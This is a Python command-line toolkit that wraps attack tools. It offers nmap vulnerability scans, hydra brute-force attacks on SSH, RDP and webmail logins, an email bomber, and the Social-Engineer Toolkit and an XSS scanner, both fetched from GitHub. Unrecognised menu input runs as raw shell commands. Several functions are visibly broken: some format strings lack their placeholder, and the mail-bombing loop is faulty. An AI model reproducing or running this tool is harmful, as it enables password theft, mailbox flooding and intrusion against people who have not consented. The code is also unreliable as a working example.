#!/usr/bin/python
# -*- coding: utf-8 -*-
# Author : Shyam Acharjya

import os
from os import system as s
import time
import getpass
import smtplib
import sys
import configparser
from time import gmtime, strftime, sleep

#checks the python version
if sys.version_info[0] != 3:
    print('''
	REQUIRED PYTHON 3.x
	use: python3 athanasius.py''')
    sys.exit()

#the configuration Settings
installDir = os.path.dirname(os.path.abspath(__file__)) + '/'
configFile = installDir + "config/athanasius.cfg"
config = configparser.RawConfigParser()
config.read(configFile)
toolDir = installDir + config.get('athanasius', 'toolDir')

class color:
    def __init__(self):
        self.BOLD = '\033[1m'
        self.RED = '\033[91m'
        self.YELLOW = '\033[93m'
        self.END = '\033[0m'

fa = color()

logo = fa.RED + fa.BOLD + r'''

             _  _____ _   _    _    _   _    _    ____ ___ _   _ ____ 
            / \|_   _| | | |  / \  | \ | |  / \  / ___|_ _| | | / ___| 
           / _ \ | | | |_| | / _ \ |  \| | / _ \ \___ \| || | | \___ \ 
          / ___ \| | |  _  |/ ___ \| |\  |/ ___ \ ___) | || |_| |___) | 
         /_/   \_\_| |_| |_/_/   \_\_| \_/_/   \_\____/___|\___/|____/ v1.0


                            Coded By : Shyam Acharjya
                           contact : sR333@tutanota.com 
''' + fa.END

Prompt = fa.BOLD + "root@noob:" + fa.END

class Athanasius:

    def __init__(self):
        s('clear')
        print(logo + fa.BOLD + '''\n
        [0] Info Gathering                               [1] Password Attack
        [2] Nmap Scripts                                 [3] Generate Wordlist
        [4] Mail Bombing                                 [5] Spoofing Attack
        [6] SQL Attacks                                  [7] Xss Attacks\n
        ''' + fa.RED + '''[99] Exit \n''' + fa.END)

        choice = input(Prompt)

        if choice == "0":
            InfoGathering()
        elif choice == "1":
            PasswordAttacks()
        elif choice == "2":
            NmapScripts()
        elif choice == "3":
            cupp()
        elif choice == "4":
            mail_bomber()
        elif choice == "5":
            Spoofing()
        elif choice == "6":
            print(fa.RED + "\ncoming soon\n" + fa.END)
        elif choice == "7":
            XssAttack()
        elif choice == "99":
            exit()
        else:
            try:
                print(os.system(choice))
            except:
                pass

class InfoGathering:

    def __init__(self):
        s('clear')
        print(logo + fa.BOLD + '''\n\n
        [0] Ping Scan                                    [1] Quick Scan
        [2] Quick Scan Plus                              [3] Quick Traceroute
        [4] Intense Scan                                 [5] Intense scan(all ports)\n
        ''' + fa.YELLOW + '''[99] Return To Main Menu \n''' + fa.END)
        self.choose_scan()

    def choose_scan(self):
        choice = input(Prompt)
        if choice == "0":
            target = input("please Provide The Target: ")
            s('nmap -sn %s' % (target))
        elif choice == "1":
            target = input("please Provide The Target: ")
            s('nmap -T4 -F %s' % (target))
        elif choice == "2":
            target = input("please Provide The Target: ")
            s('nmap -sV -T4 -O -F --version-light %s' % (target))
        elif choice == "3":
            target = input("please Provide The Target: ")
            s('nmap -sn --traceroute %s' % (target))
        elif choice == "4":
            target = input("please Provide The Target: ")
            s('nmap -T4 -A -v %s' % (target))
        elif choice == "5":
            target = input("please Provide The Target: ")
            s('nmap -p 1-65535 -T4 -A -v %s' % (target))
        elif choice == "99":
            Athanasius()
        else:
            try:
                print(os.system(choice))
            except:
                pass

class PasswordAttacks:

    def __init__(self):
        s('clear')
        print(logo + fa.BOLD + '''\n
        [0] Cisco Brute Force                           [1] VNC Brute Force
        [2] FTP Brute Force                             [3] Gmail Brute Force
        [4] SSH Brute Force                             [5] Telnet Brute Force
        [6] YahooMail Brute Force                       [7] HotMail Brute Force
        [8] RDP Brute Force                             [9] MySQL Brute Force\n
        ''' + fa.YELLOW + '''[99] Return To Main Menu \n''' + fa.END)
        self.choose_attack()

    def choose_attack(self):
        choice = input(Prompt)
        if choice == '0':
            print("""\n
                        +========================================+
                        |.......[◉] Cisco Brute Force [◉]........|
                        +========================================+\n""")
            iphost = input("[*] IP/Hostname : ")
            word = input("[*] Wordlist : ")
            s("hydra -P %s %s cisco" % (word, iphost))
            sys.exit()
        elif choice == '1':
            print("""\n
                        +========================================+
                        |.........[◉] VNC Brute Force [◉]........|
                        +========================================+\n""")
            iphost = input("[*] IP/Hostname : ")
            word = input("[*] Wordlist : ")
            s("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
            sys.exit()
        elif choice == '2':
            print("""\n
                        +========================================+
                        |.........[◉] FTP Brute Force [◉]........|
                        +========================================+\n""")
            user = input('[*] User:')
            iphost = input("[*] IP/Hostname : ")
            word = input("[*] Wordlist : ")
            s("hydra -l %s -P %s %s ftp" % (user, word, iphost))
            sys.exit()
        elif choice == '3':
            print("""\n
                        +========================================+
                        |........[◉] Gmail Brute Force [◉].......|
                        +========================================+\n""")
            email = input("[*] Email : ")
            word = input("[*] Wordlist : ")
            s("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
            sys.exit()
        elif choice == '4':
            print("""\n
                        +========================================+
                        |.........[◉] SSh Brute Force [◉]........|
                        +========================================+\n""")
            user = input('[*] User:')
            iphost = input("[*] IP/Hostname : ")
            word = input("[*] Wordlist : ")
            s("hydra -l %s -P %s %s ssh" % (user, word, iphost))
            sys.exit()
        elif choice == '5':
            print("""\n
                        +========================================+
                        |.......[◉] Telnet Brute Force [◉].......|
                        +========================================+\n""")
            user = input('[*] User:')
            word = input("[*] Wordlist : ")
            iphost = input("[*] IP/Hostname : ")
            s("hydra -l %s -P %s %s telnet" % (user, word, iphost))
            sys.exit()
        elif choice == '6':
            print("""\n
                        +========================================+
                        |.........[◉] Yahoo Brute Force [◉]........|
                        +========================================+\n""")
            email = input('[*] User:')
            word = input("[*] Wordlist : ")
            s("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
            sys.exit()
        elif choice == '7':
            print("""\n
                        +========================================+
                        |.......[◉] Hotmail Brute Force [◉]......|
                        +========================================+\n""")
            email = input('[*] User:')
            word = input("[*] Wordlist : ")
            s("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
            sys.exit()
        elif choice == '8':
            print("""\n
                        +========================================+
                        |.........[◉] RDP Brute Force [◉]........|
                        +========================================+\n""")
            user = input('[*] User:')
            word = input("[*] Wordlist : ")
            iphost = input("[*] IP/Hostname : ")
            s("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
            sys.exit()
        elif choice == '9':
            print("""\n
                        +========================================+
                        |........[◉] MySQL Brute Force [◉].......|
                        +========================================+\n""")
            user = input('[*] User:')
            word = input("[*] Wordlist : ")
            s("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
            sys.exit()
        elif choice == "99":
            Athanasius()
        else:
            try:
                print(os.system(choice))
            except:
                pass


class NmapScripts:
    
    def __init__(self):
        s('clear')
        print(logo + fa.BOLD + '''\n\n
        [0] Cross Site Request Forgery                      [1] Smb_ms17_o10
        [2] Dns Brutforce                                   [3] Firewall Bypass
        [4] Smb_ms08_067                                    [5] Smb_ms07_029
        [6] Rdp_ms12_020                                    [7] Ssl-heartbleed
        [8] Mysql dump hashes                               [9] Smtp-enum-users
        [10] Smb Brutforce                                  [11] Wordpress Brutforce\n
        ''' + fa.YELLOW + '''[99] Return To Main Menu \n''' + fa.END)
        self.choose_scan()
    def choose_scan(self):
        choice = input(Prompt)
        if choice == "0":
            target = input("please Provide The Target: ")
            s('nmap -p80 --script http-csrf.nse' % (target))
        elif choice == "1":
            target = input("please Provide The Target: ")
            s('nmap -p445 --script smb-vuln-ms17-010' % (target))
        elif choice == "2":
            target = input("please Provide The Target: ")
            s('nmap --script dns-brute' % (target))
        elif choice == "3":
            target = input("please Provide The Target: ")
            s('nmap --script firewall-bypass' % (target))
        elif choice == "4":
            target = input("please Provide The Target: ")
            s('nmap --script smb-vuln-ms08-067.nse -p445' % (target))
        elif choice == "5":
            target = input("please Provide The Target: ")
            s('nmap --script smb-vuln-ms07-029.nse -p445' % (target))
        elif choice == "6":
            target = input("please Provide The Target: ")
            s('nmap -sV --script=rdp-vuln-ms12-020 -p 3389' % (target))
        elif choice == "7":
            target = input("please Provide The Target: ")
            s('nmap -p 443 --script ssl-heartbleed' % (target))
        elif choice == "8":
            target = input("please Provide The Target: ")
            s('nmap -p 3306 <ip> --script mysql-dump-hashes --script-args="username=root,password=secret"' % (target))
        elif choice == "9":
            target = input("please Provide The Target: ")
            s('nmap --script smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] -p 25,465,587' % (target))
        elif choice == "10":
            target = input("please Provide The Target: ")
            s('nmap --script smb-brute.nse -p445' % (target))
        elif choice == "11":
            target = input("please Provide The Target: ")
            s('nmap -sV --script http-wordpress-brute' % (target))
        elif choice == "99":
            Athanasius()
        else:
            try:
                print(s(choice))
            except:
                pass

class cupp:

    def __init__(self):
        self.installDir = toolDir + "cupp"
        self.gitRepo = "https://github.com/Mebus/cupp.git"

        if not self.installed():
            os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def run(self):
        os.system("python %s/cupp.py -i" % self.installDir)



def mail_bomber():
    s("clear")
    print(logo + fa.BOLD)
    print(fa.BOLD + """\n
                    +========================================+
                    |..........[◉] Email Bomber [◉]..........|
                    +========================================+\n\n""")
    to = input('\n[◉] Target Mail address : ')
    user = input('\n[◉] Sender Email : ')
    passwd = getpass.getpass('\n[◉] Password : ')
    subject = input('Subject: ')
    body = input('\n[◉] Message : ')
    total = input('\n[◉] Number of send : ')
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, passwd)
        for i in range(1, total+1):
            subject = os.urandom(9)
            msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
            server.sendmail(user, to, msg)
            print("\r[✔] E-mails sent: %i" % i)
            sys.stdout.flush()
            server.quit()
            print('\n[✔] Done [✔] !!!')
    except smtplib.SMTPServerDisconnected:
        server
    except smtplib.SMTPAuthenticationError:
        print('\n[✘] The username or password you entered is incorrect.')
        sys.exit()


class Spoofing:
    def __init__(self):
        s('clear')
        print(logo)
        self.installDir = toolDir + "setoolkit"
        self.gitRepo = "https://github.com/trustedsec/social-engineer-toolkit.git"

        if not self.installed():
            os.system("apt-get --force-yes -y install git apache2 python-requests libapache2-mod-php \
                python-pymssql build-essential python-pexpect python-pefile python-crypto python-openssl")
            os.system("git clone --depth=1 %s %s" % (self.gitRepo, self.installDir))
            os.system("cd %s && python setup.py install" % self.installDir)
            self.run()
        else:
            print("alreadyInstalled")
            self.run()

    def installed(self):
        return (os.path.isfile("/usr/bin/setoolkit"))

    def run(self):
        os.system("setoolkit")


class SqlAttack:
    #todo:write this after finishing the cli design
    pass


class XssAttack:
    
    def __init__(self):
        self.installDir = toolDir + "Xsspy"
        self.gitRepo = "https://github.com/faizann24/XssPy.git"
        if not self.installed():
            os.system("git clone --depth=1 {} {}".format(self.gitRepo, self.installDir))
        self.run()

    def installed(self):
        return (os.path.isdir(self.installDir))

    def run(self):
        target = input("Enter Website Address: ")
        os.system("python {}/XssPy.py -u {}".format(self.installDir, target))


Athanasius()
